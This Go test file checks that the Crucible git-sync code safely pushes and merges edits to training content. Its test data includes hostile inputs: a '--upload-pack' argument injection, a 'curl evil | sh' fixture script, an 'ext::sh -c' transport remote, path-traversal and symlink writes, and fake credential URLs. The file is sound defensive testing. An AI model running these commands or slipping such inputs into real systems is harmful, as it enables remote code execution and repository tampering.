package gitsync

import (
	"context"
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"crucible/internal/apperr"
)

func trainingFiles() map[string]string {
	return map[string]string{
		"training.yaml":               "id: t1\ntitle: T1\nmaintainers: [m@x]\nmodules: [m1]\n",
		"modules/m1/module.yaml":      "title: M1\nitems:\n  - reading: reading/intro.md\n",
		"modules/m1/reading/intro.md": "# Intro\n\nHello.\n",
	}
}

func contentRepo(t *testing.T, remote string) *ContentRepo {
	return &ContentRepo{URL: remote, Branch: "main", Dir: filepath.Join(t.TempDir(), "edits"), Name: "Crucible", Email: "bot@x"}
}

// pushTo commits files to the remote's main from a separate clone (someone else pushing).
func pushTo(t *testing.T, remote string, files map[string]string) {
	t.Helper()
	work := filepath.Join(t.TempDir(), "other")
	run(t, "", "clone", "-q", remote, work)
	for rel, body := range files {
		if err := writeFile(work, rel, body); err != nil {
			t.Fatal(err)
		}
	}
	run(t, work, "add", "-A")
	run(t, work, "-c", "user.name=o", "-c", "user.email=o@x", "commit", "-qm", "other change")
	run(t, work, "push", "-q", "origin", "HEAD:main")
}

func TestPushEditAndMerge(t *testing.T) {
	ctx := context.Background()
	remote := bare(t, trainingFiles())
	base := gitOut(t, remote, "rev-parse", "main")
	c := contentRepo(t, remote)
	sha, diff, err := c.PushEdit(ctx, "crucible/edit/1", base, map[string]string{
		"modules/m1/reading/intro.md": "# Intro\n\nHello, smith.\n",
	}, "A@X", "Greet the smith")
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(diff, "+Hello, smith.") || gitOut(t, remote, "rev-parse", "crucible/edit/1") != sha {
		t.Fatalf("diff %q / branch", diff)
	}
	if got := gitOut(t, remote, "log", "-1", "--format=%an <%ae>|%cn|%B", sha); !strings.Contains(got, "a@x <a@x>|Crucible|Greet the smith") || !strings.Contains(got, "Crucible-Actor: a@x") {
		t.Fatalf("author is the user, committer the bot: %q", got)
	}
	if gitOut(t, remote, "rev-parse", "main") != base {
		t.Fatal("pushing an edit never touches main")
	}
	merged, err := c.Merge(ctx, "crucible/edit/1", sha, "crucible: merge edit 1", "m@x")
	if err != nil {
		t.Fatal(err)
	}
	if parents := strings.Fields(gitOut(t, remote, "rev-list", "--parents", "-n1", "main")); len(parents) != 3 || parents[0] != merged {
		t.Fatalf("a merge commit on main: %v", parents)
	}
	if body := gitOut(t, remote, "show", "main:modules/m1/reading/intro.md"); !strings.Contains(body, "smith") {
		t.Fatal("merged content")
	}
	if got := gitOut(t, remote, "log", "-1", "--format=%an|%B", "main"); !strings.HasPrefix(got, "Crucible|") || !strings.Contains(got, "Crucible-Actor: m@x") {
		t.Fatalf("merge commit is the bot's with the approver's trailer: %q", got)
	}
	if err := c.DeleteBranch(ctx, "crucible/edit/1"); err != nil {
		t.Fatal(err)
	}
	if out := gitOut(t, remote, "branch", "--list", "crucible/edit/1"); out != "" {
		t.Fatalf("branch deleted: %q", out)
	}
	if err := c.DeleteBranch(ctx, "crucible/edit/1"); err != nil {
		t.Fatalf("deleting a gone branch is fine: %v", err)
	}
}

func TestGitErrorsHideCredentials(t *testing.T) {
	_, err := git(context.Background(), "", "ls-remote", "--", "https://bot:s3cret@127.0.0.1:1/x.git")
	if err == nil || strings.Contains(err.Error(), "s3cret") || !strings.Contains(err.Error(), "https://***@127.0.0.1") {
		t.Fatalf("credentials in error: %v", err)
	}
}

func TestMergeConflictPushesNothing(t *testing.T) {
	ctx := context.Background()
	remote := bare(t, trainingFiles())
	base := gitOut(t, remote, "rev-parse", "main")
	c := contentRepo(t, remote)
	sha, _, err := c.PushEdit(ctx, "crucible/edit/2", base, map[string]string{"modules/m1/reading/intro.md": "# Intro\n\nMine.\n"}, "a@x", "mine")
	if err != nil {
		t.Fatal(err)
	}
	pushTo(t, remote, map[string]string{"modules/m1/reading/intro.md": "# Intro\n\nTheirs.\n"})
	tip := gitOut(t, remote, "rev-parse", "main")
	if _, err := c.Merge(ctx, "crucible/edit/2", sha, "merge", "m@x"); !errors.Is(err, ErrMergeConflict) {
		t.Fatalf("conflict: %v", err)
	}
	if gitOut(t, remote, "rev-parse", "main") != tip {
		t.Fatal("a conflicting merge pushes nothing")
	}
}

func TestMergeLandsOnTopOfNewerCommits(t *testing.T) {
	ctx := context.Background()
	remote := bare(t, trainingFiles())
	base := gitOut(t, remote, "rev-parse", "main")
	c := contentRepo(t, remote)
	sha, _, err := c.PushEdit(ctx, "crucible/edit/3", base, map[string]string{"modules/m1/reading/intro.md": "# Intro\n\nMine.\n"}, "a@x", "mine")
	if err != nil {
		t.Fatal(err)
	}
	pushTo(t, remote, map[string]string{"modules/m1/reading/extra.md": "# Extra\n"})
	if _, err := c.Merge(ctx, "crucible/edit/3", sha, "merge", "m@x"); err != nil {
		t.Fatal(err)
	}
	if gitOut(t, remote, "show", "main:modules/m1/reading/extra.md") == "" || !strings.Contains(gitOut(t, remote, "show", "main:modules/m1/reading/intro.md"), "Mine.") {
		t.Fatal("both changes on main")
	}
}

func TestMergeRefusesInvalidResult(t *testing.T) {
	ctx := context.Background()
	remote := bare(t, trainingFiles())
	base := gitOut(t, remote, "rev-parse", "main")
	c := contentRepo(t, remote)
	sha, _, err := c.PushEdit(ctx, "crucible/edit/4", base, map[string]string{"training.yaml": "id: t1\ntitle: T1\nmaintainers: [m@x]\nmodules: [m1, missing]\n"}, "a@x", "break it")
	if err != nil {
		t.Fatal(err)
	}
	if _, err := c.Merge(ctx, "crucible/edit/4", sha, "merge", "m@x"); !errors.Is(err, ErrMergeInvalid) || !errors.Is(err, apperr.Conflict) {
		t.Fatalf("invalid result: %v", err)
	}
	if gitOut(t, remote, "rev-parse", "main") != base {
		t.Fatal("nothing pushed")
	}
}

func TestMergeRefusesMaintainerChangeOnTheBranch(t *testing.T) {
	ctx := context.Background()
	remote := bare(t, trainingFiles())
	c := contentRepo(t, remote)
	// someone with git access pushes a maintainers change straight to an edit branch
	work := filepath.Join(t.TempDir(), "w")
	run(t, "", "clone", "-q", remote, work)
	if err := writeFile(work, "training.yaml", "id: t1\ntitle: T1\nmaintainers: [a@x]\nmodules: [m1]\n"); err != nil {
		t.Fatal(err)
	}
	run(t, work, "-c", "user.name=o", "-c", "user.email=o@x", "commit", "-qam", "me")
	run(t, work, "push", "-q", "origin", "HEAD:refs/heads/crucible/edit/9")
	base := gitOut(t, remote, "rev-parse", "main")
	if _, err := c.Merge(ctx, "crucible/edit/9", gitOut(t, remote, "rev-parse", "crucible/edit/9"), "merge", "m@x"); !errors.Is(err, ErrMergeInvalid) {
		t.Fatalf("maintainers change: %v", err)
	}
	if gitOut(t, remote, "rev-parse", "main") != base {
		t.Fatal("nothing pushed")
	}
}

func TestPushEditRefusesSymlinksAndBadNames(t *testing.T) {
	ctx := context.Background()
	remote := bare(t, trainingFiles())
	work := filepath.Join(t.TempDir(), "w")
	run(t, "", "clone", "-q", remote, work)
	if err := os.Symlink("/etc", filepath.Join(work, "modules", "m1", "linked")); err != nil {
		t.Fatal(err)
	}
	run(t, work, "add", "-A")
	run(t, work, "-c", "user.name=o", "-c", "user.email=o@x", "commit", "-qm", "symlink")
	run(t, work, "push", "-q", "origin", "HEAD:main")
	base := gitOut(t, remote, "rev-parse", "main")
	c := contentRepo(t, remote)
	if _, _, err := c.PushEdit(ctx, "crucible/edit/5", base, map[string]string{"modules/m1/linked/passwd.md": "x"}, "a@x", "x"); !errors.Is(err, apperr.Invalid) {
		t.Fatalf("writing through a symlinked folder: %v", err)
	}
	for _, b := range []string{"main", "crucible/edit/x", "--upload-pack=evil"} {
		if _, _, err := c.PushEdit(ctx, b, base, map[string]string{"modules/m1/reading/a.md": "x"}, "a@x", "x"); err == nil {
			t.Fatalf("branch %q accepted", b)
		}
	}
}

func TestPushEditRefusesBadFiles(t *testing.T) {
	ctx := context.Background()
	remote := bare(t, trainingFiles())
	base := gitOut(t, remote, "rev-parse", "main")
	c := contentRepo(t, remote)
	many := map[string]string{}
	for i := range 21 {
		many[filepath.Join("modules", "m1", "reading", string(rune('a'+i))+".md")] = "x"
	}
	cases := map[string]map[string]string{
		"dotdot":       {"../escape.md": "x"},
		"inner dotdot": {"modules/../../escape.md": "x"},
		"absolute":     {"/tmp/x.md": "x"},
		"git dir":      {".git/hooks/pre-commit.sh": "x"},
		"nested git":   {"modules/.GIT/config.yaml": "x"},
		"backslash":    {`modules\m1\x.md`: "x"},
		"nul":          {"a\x00.md": "x"},
		"extension":    {"modules/m1/main.tf": "x"},
		"binary":       {"modules/m1/reading/a.md": "x\x00y"},
		"too big":      {"modules/m1/reading/a.md": strings.Repeat("x", 256<<10+1)},
		"too many":     many,
		"empty":        {},
		"maintainers":  {"training.yaml": "id: t1\ntitle: T1\nmaintainers: [a@x]\nmodules: [m1]\n"},
		"unclean":      {"modules//m1/x.md": "x"},
		"workflow":     {".github/workflows/x.yml": "on: push\njobs: {}\n"},
		"gitlab ci":    {".gitlab-ci.yml": "x: 1\n"},
		"circleci":     {".circleci/config.yml": "x: 1\n"},
		"script root":  {"scripts/deploy.sh": "#!/bin/sh\n"},
		"top level":    {"a.md": "x"},
		"no module":    {"modules/x.md": "x"},
		"hidden":       {"modules/m1/.hidden.md": "x"},
		"hidden dir":   {"modules/m1/.github/x.yml": "x"},
		"trailing dot": {"modules./m1/x.md": "x"},
		"space":        {"modules/m1/x .md": "x"},
		"zero width":   {"modules/m1/.g\u200bit/x.md": "x"},
		"unicode":      {"modules/m1/réad.md": "x"},
		"long name":    {"modules/m1/" + strings.Repeat("x", 200) + ".md": "x"},
		"case file":    {"modules/m1/Module.yaml": "x"},
		"case root":    {"Training.yaml": "x"},
		"case dir":     {"modules/M1/reading/x.md": "x"},
		"case pair":    {"modules/m1/reading/n.md": "x", "modules/m1/reading/N.md": "x"},
	}
	for name, files := range cases {
		if _, _, err := c.PushEdit(ctx, "crucible/edit/6", base, files, "a@x", "x"); !errors.Is(err, apperr.Invalid) {
			t.Errorf("%s: %v", name, err)
		}
	}
	if _, _, err := c.PushEdit(ctx, "crucible/edit/6", base, map[string]string{"modules/m1/reading/a.md": "x"}, "a@x>\n-x <e", "x"); !errors.Is(err, apperr.Invalid) {
		t.Errorf("author: %v", err)
	}
	if out := gitOut(t, remote, "branch", "--list", "crucible/edit/6"); out != "" {
		t.Fatalf("nothing pushed: %q", out)
	}
}

func TestPushEditRefusesABaseOffTheBranch(t *testing.T) {
	ctx := context.Background()
	remote := bare(t, trainingFiles())
	base := gitOut(t, remote, "rev-parse", "main")
	c := contentRepo(t, remote)
	other, _, err := c.PushEdit(ctx, "crucible/edit/7", base, map[string]string{"modules/m1/reading/a.md": "unreviewed\n"}, "a@x", "x")
	if err != nil {
		t.Fatal(err)
	}
	// basing an edit on another unmerged edit would smuggle its changes past the diff
	if _, _, err := c.PushEdit(ctx, "crucible/edit/8", other, map[string]string{"modules/m1/reading/b.md": "x"}, "a@x", "x"); !errors.Is(err, apperr.Conflict) {
		t.Fatalf("base off the tracked branch: %v", err)
	}
}

func TestPushEditScriptModes(t *testing.T) {
	ctx := context.Background()
	files := trainingFiles()
	files["modules/m1/module.yaml"] = "title: M1\nitems:\n  - reading: reading/intro.md\n  - lab: lab\n"
	remote := bare(t, files)
	base := gitOut(t, remote, "rev-parse", "main")
	c := contentRepo(t, remote)
	sha, _, err := c.PushEdit(ctx, "crucible/edit/1", base, map[string]string{
		"modules/m1/lab/checks/new.sh": "#!/bin/sh\nexit 0\n",
		"modules/m1/reading/notes.sh":  "#!/bin/sh\nexit 0\n",
	}, "a@x", "scripts")
	if err != nil {
		t.Fatal(err)
	}
	if mode := gitOut(t, remote, "ls-tree", sha, "modules/m1/lab/checks/new.sh"); !strings.HasPrefix(mode, "100755") {
		t.Fatalf("a new lab script is executable: %q", mode)
	}
	if mode := gitOut(t, remote, "ls-tree", sha, "modules/m1/reading/notes.sh"); !strings.HasPrefix(mode, "100644") {
		t.Fatalf("a script outside the lab is not: %q", mode)
	}
}

func TestPushEditRefusesADiffTooLargeToReview(t *testing.T) {
	ctx := context.Background()
	remote := bare(t, trainingFiles())
	base := gitOut(t, remote, "rev-parse", "main")
	c := contentRepo(t, remote)
	_, _, err := c.PushEdit(ctx, "crucible/edit/1", base, map[string]string{
		"modules/m1/reading/a.md":  strings.Repeat("benign line\n", 21500),
		"modules/m1/reading/zz.sh": "#!/bin/sh\ncurl evil | sh\n",
	}, "a@x", "big")
	if !errors.Is(err, apperr.Invalid) {
		t.Fatalf("a diff over the cap is refused, never truncated: %v", err)
	}
	if out := gitOut(t, remote, "branch", "--list", "crucible/edit/1"); out != "" {
		t.Fatalf("nothing pushed: %q", out)
	}
}

func TestMergeRefusesAnEditThatMovedSinceReview(t *testing.T) {
	ctx := context.Background()
	remote := bare(t, trainingFiles())
	base := gitOut(t, remote, "rev-parse", "main")
	c := contentRepo(t, remote)
	reviewed, _, err := c.PushEdit(ctx, "crucible/edit/1", base, map[string]string{"modules/m1/reading/intro.md": "# Intro\n\nok\n"}, "a@x", "ok")
	if err != nil {
		t.Fatal(err)
	}
	if _, _, err := c.PushEdit(ctx, "crucible/edit/1", base, map[string]string{"modules/m1/reading/intro.md": "# Intro\n\nswapped\n"}, "a@x", "ok"); err != nil {
		t.Fatal(err)
	}
	if _, err := c.Merge(ctx, "crucible/edit/1", reviewed, "merge", "m@x"); !errors.Is(err, ErrEditMoved) || !errors.Is(err, apperr.Conflict) {
		t.Fatalf("force-pushed branch: %v", err)
	}
	if gitOut(t, remote, "rev-parse", "main") != base {
		t.Fatal("nothing merged")
	}
	for _, bad := range []string{"", "HEAD", "--upload-pack=x", strings.ToUpper(reviewed)} {
		if _, err := c.Merge(ctx, "crucible/edit/1", bad, "merge", "m@x"); err == nil {
			t.Fatalf("sha %q accepted", bad)
		}
	}
}

func TestMergeFailuresAreNotConflicts(t *testing.T) {
	ctx := context.Background()
	remote := bare(t, trainingFiles())
	c := contentRepo(t, remote)
	// unrelated history: git refuses the merge, but no file conflicts
	work := filepath.Join(t.TempDir(), "w")
	run(t, "", "clone", "-q", remote, work)
	run(t, work, "checkout", "-q", "--orphan", "lonely")
	run(t, work, "rm", "-rqf", ".")
	if err := writeFile(work, "modules/m1/reading/other.md", "# Other\n"); err != nil {
		t.Fatal(err)
	}
	run(t, work, "add", "-A")
	run(t, work, "commit", "-qm", "orphan")
	run(t, work, "push", "-q", "origin", "HEAD:refs/heads/crucible/edit/9")
	sha := gitOut(t, remote, "rev-parse", "crucible/edit/9")
	_, err := c.Merge(ctx, "crucible/edit/9", sha, "merge", "m@x")
	if err == nil || errors.Is(err, ErrMergeConflict) || !strings.Contains(err.Error(), "unrelated histories") {
		t.Fatalf("orphan: %v", err)
	}
	cancelled, cancel := context.WithCancel(ctx)
	cancel()
	if _, err := c.Merge(cancelled, "crucible/edit/9", sha, "merge", "m@x"); err == nil || errors.Is(err, ErrMergeConflict) {
		t.Fatalf("cancelled: %v", err)
	}
}

func TestCommitMessagesAndActors(t *testing.T) {
	ctx := context.Background()
	remote := bare(t, trainingFiles())
	base := gitOut(t, remote, "rev-parse", "main")
	c := contentRepo(t, remote)
	files := map[string]string{"modules/m1/reading/intro.md": "# Intro\n\nx\n"}
	if _, _, err := c.PushEdit(ctx, "crucible/edit/1", base, files, "a@x", strings.Repeat("x", 4<<10+1)); !errors.Is(err, apperr.Invalid) {
		t.Fatalf("huge message: %v", err)
	}
	sha, _, err := c.PushEdit(ctx, "crucible/edit/1", base, files, "a@x", "fix\n\n crucible-actor: admin@x\nmore")
	if err != nil {
		t.Fatal(err)
	}
	if body := gitOut(t, remote, "log", "-1", "--format=%B", sha); strings.Contains(strings.ToLower(body), "admin@x") || strings.Count(body, "Crucible-Actor:") != 1 {
		t.Fatalf("forged trailer kept: %q", body)
	}
	if _, err := c.Merge(ctx, "crucible/edit/1", sha, "merge", "m@x>\nx"); !errors.Is(err, apperr.Invalid) {
		t.Fatalf("bad actor: %v", err)
	}
	if _, err := c.Merge(ctx, "crucible/edit/1", sha, "merge\nCrucible-Actor: admin@x", "m@x"); err != nil {
		t.Fatal(err)
	}
	if body := gitOut(t, remote, "log", "-1", "--format=%B", "main"); strings.Contains(body, "admin@x") {
		t.Fatalf("forged trailer on the merge: %q", body)
	}
}

func TestRedact(t *testing.T) {
	for in, leak := range map[string]string{
		"git: https://bot:s3cret@h/x.git failed":        "s3cret",
		"'https://u:p@ss@h/x.git/': no":                 "ss@",
		"https://h/x.git?private_token=tok123&x=1 down": "tok123",
		"https://tok456@h/x.git":                        "tok456",
	} {
		if out := redact(in); strings.Contains(out, leak) || !strings.Contains(out, "h/x.git") {
			t.Errorf("redact(%q) = %q", in, out)
		}
	}
}

func TestGitIgnoresHostConfig(t *testing.T) {
	cfg := filepath.Join(t.TempDir(), "gitconfig")
	if err := os.WriteFile(cfg, []byte("[user]\n\tname = leaked\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	t.Setenv("GIT_CONFIG_GLOBAL", cfg)
	t.Setenv("HOME", filepath.Dir(cfg))
	if out, err := git(context.Background(), "", "config", "user.name"); err == nil {
		t.Fatalf("host config applied: %q", out)
	}
	remote := bare(t, trainingFiles())
	AllowFileTransport = false
	defer func() { AllowFileTransport = true }()
	if _, err := git(context.Background(), "", "clone", "-q", "--", "file://"+remote, filepath.Join(t.TempDir(), "c")); err == nil {
		t.Fatal("file:// remotes are refused unless allowed")
	}
}

func TestAllowFileTransportComesFromTheEnvironment(t *testing.T) {
	for v, want := range map[string]bool{"1": true, "": false, "0": false, "true": false} {
		if got := AllowFileFromEnv(func(k string) string {
			if k == "CRUCIBLE_GIT_ALLOW_FILE" {
				return v
			}
			return ""
		}); got != want {
			t.Errorf("CRUCIBLE_GIT_ALLOW_FILE=%q: %v", v, got)
		}
	}
}

func TestEditDiffIgnoresRepoAttributes(t *testing.T) {
	ctx := context.Background()
	files := trainingFiles()
	files[".gitattributes"] = "*.md binary\n"
	remote := bare(t, files)
	base := gitOut(t, remote, "rev-parse", "main")
	c := contentRepo(t, remote)
	_, diff, err := c.PushEdit(ctx, "crucible/edit/1", base, map[string]string{"modules/m1/reading/intro.md": "# Intro\n\nsneaky line\n"}, "a@x", "x")
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(diff, "+sneaky line") {
		t.Fatalf("the reviewer sees the text change whatever .gitattributes says: %q", diff)
	}
}

func TestLabDirDotIsNotALabDir(t *testing.T) {
	ctx := context.Background()
	files := trainingFiles()
	files["modules/m1/module.yaml"] = "title: M1\nitems:\n  - reading: reading/intro.md\n  - lab: .\n"
	remote := bare(t, files)
	base := gitOut(t, remote, "rev-parse", "main")
	c := contentRepo(t, remote)
	sha, _, err := c.PushEdit(ctx, "crucible/edit/1", base, map[string]string{"modules/m1/reading/notes.sh": "#!/bin/sh\nexit 0\n"}, "a@x", "x")
	if err != nil {
		t.Fatal(err)
	}
	if mode := gitOut(t, remote, "ls-tree", sha, "modules/m1/reading/notes.sh"); !strings.HasPrefix(mode, "100644") {
		t.Fatalf("lab: . never makes the whole module executable: %q", mode)
	}
	dir := t.TempDir()
	for lab, want := range map[string]string{".": "", "./": "", "lab/..": "", "": "", "../x": "", "/abs": "", "lab/": "modules/m1/lab/", "./lab": "modules/m1/lab/"} {
		if err := writeFile(dir, "modules/m1/module.yaml", "items:\n  - lab: \""+lab+"\"\n"); err != nil {
			t.Fatal(err)
		}
		if got := labDir(dir, "modules/m1/x.sh"); got != want {
			t.Errorf("lab %q: %q, want %q", lab, got, want)
		}
	}
}

func TestExtTransportIsRefusedEvenWithFileAllowed(t *testing.T) {
	marker := filepath.Join(t.TempDir(), "ran")
	_, err := git(context.Background(), "", "clone", "-q", "--", "ext::sh -c 'touch "+marker+"'", filepath.Join(t.TempDir(), "c"))
	if err == nil {
		t.Fatal("ext:: remotes must be refused")
	}
	if _, serr := os.Stat(marker); serr == nil {
		t.Fatal("ext:: command ran")
	}
}
